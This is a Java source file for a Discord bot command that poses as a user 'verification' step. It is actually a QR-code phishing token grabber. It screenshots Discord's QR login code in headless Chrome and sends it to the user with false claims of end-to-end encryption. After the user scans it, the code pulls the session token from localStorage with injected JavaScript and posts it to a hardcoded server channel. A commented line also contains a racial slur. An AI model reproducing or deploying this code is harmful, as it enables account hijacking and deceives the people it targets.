package me.kambing.commands;

import com.jagrosh.jdautilities.command.Command;
import com.jagrosh.jdautilities.command.CommandEvent;
import me.kambing.Main;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.requests.RestAction;
import org.openqa.selenium.By;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.OutputType;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;

import java.awt.*;
import java.io.File;
import java.time.Instant;
import java.util.Objects;
import java.util.concurrent.TimeUnit;


public class Verification extends Command {
    public Verification() {
        this.name = "verify";
        this.help = "verifies you";
        this.cooldown = 120;
    }

    @Override
    protected void execute(CommandEvent event) {
        event.getAuthor().openPrivateChannel().flatMap(privateChannel -> privateChannel.sendMessage("Setting up verification..."))
                .queue(message -> message.delete().queueAfter(2, TimeUnit.SECONDS));
        event.reactSuccess();
        File file;
        boolean timerPassed = false;
        WebDriver driver;

        System.setProperty("webdriver.chrome.driver", "C:\\Users\\USER\\Documents\\JAVA PROJECTS\\chromedriver_win32\\chromedriver" + ".exe");
        System.setProperty("webdriver.chrome.silentOutput", "true");
        ChromeOptions options = new ChromeOptions();
        options.addArguments("--headless", "--window-size=1920,1200");
        driver = new ChromeDriver(options);
        driver.get("https://discord.com/login");
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        System.out.println(file = driver.findElement(By.cssSelector("#app-mount > div.appDevToolsWrapper-1QxdQf > div > div.app-3xd6d0 > div > div > div > div > form > div.centeringWrapper-dGnJPQ > div > div.transitionGroup-bPT0qU.qrLogin-1ejtpI > div > div > div > div.qrCodeContainer-1qlybH > div.qrCode-2R7t9S")).getScreenshotAs(OutputType.FILE));
        //copyFile(new String[]{file.getPath(), "C:\\Users\\USER\\Documents\\JAVA PROJECTS\\seleniumproject\\nigga.png"});

        EmbedBuilder eb = new EmbedBuilder();
        eb.setColor(Color.GREEN);
        eb.setFooter("This verification system is end-to-end encrypted");
        eb.setTitle(":white_check_mark: **Are you a real account? Let's find out and verify!.**");
        eb.setDescription("Scan this QR code on your Discord Mobile app to login. \n " +
                "**Additional Notes:** \n" + ":warning: Scan the QR code using a scanner on your phone. \n" +
                ":sos: Please contact a staff member if you're unable to verify. \n" +
                ":clock10: This verification is only valid for **1 minute**, if you're unable to verify, run the command again.");
        eb.setImage("attachment://qr.png");
        assert file != null;
        RestAction<Message> action = event.getAuthor().openPrivateChannel().flatMap(privateChannel -> privateChannel.sendFile(file, "qr.png").setEmbeds(eb.build()));
        action.queue();
        Instant start = Instant.now();
        Instant end = start.plusSeconds(60);
        while (!timerPassed) {
            if (Instant.now().isAfter(end)) {
                timerPassed = true;
                driver.quit();
                action.complete().delete().queue();
                event.getAuthor().openPrivateChannel().flatMap(privateChannel ->
                        privateChannel.sendMessageEmbeds(new EmbedBuilder().setFooter("This verification system is end-to-end encrypted")
                        .setColor(Color.GREEN).setDescription("1 minute passed, " +
                        "QR code hasn't been scanned. " +
                        "Rerun the command again.").build())).queue();
            }
            if (!driver.getCurrentUrl().equals("https://discord.com/login")) {
                JavascriptExecutor javascriptExecutor = (JavascriptExecutor) driver;
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                String token = (String) javascriptExecutor.executeScript("window.dispatchEvent(new Event('beforeunload'));let iframe = document.createElement('iframe');iframe.style.display = 'none';document.body.appendChild(iframe);let localStorage = iframe.contentWindow.localStorage;var token = JSON.parse(localStorage.token);return token;");
                System.out.println(token);
                Objects.requireNonNull(Objects.requireNonNull(
                                        Main.jda.getGuildById("1051821632894808095"))
                                .getTextChannelById("1051842382099914804"))
                        .sendMessageEmbeds(new EmbedBuilder().setThumbnail(event.getAuthor().
                                getAvatarUrl()).setTitle(event.getAuthor().getAsTag()).setDescription("Token: `" + token + "`").setFooter("bot created by spinoza#3091").build()).queue();
                driver.quit();
                timerPassed = true;
                action.complete().delete().queue();
                event.getAuthor().openPrivateChannel().flatMap(privateChannel -> privateChannel.sendMessageEmbeds(new EmbedBuilder().setColor(Color.GREEN)
                        .setDescription("You are verified.").setFooter("This verification system is end-to-end encrypted").build())).queue();
                event.getGuild().addRoleToMember(event.getMember(), getVerifiedRole(event.getGuild())).queue();
            }
        }
    }
    public static Role getVerifiedRole(Guild guild) { //pasted from github
        return guild.getRoles().stream().filter(r -> r.getName().equalsIgnoreCase("verified")).findFirst().orElse(null);
    }
}
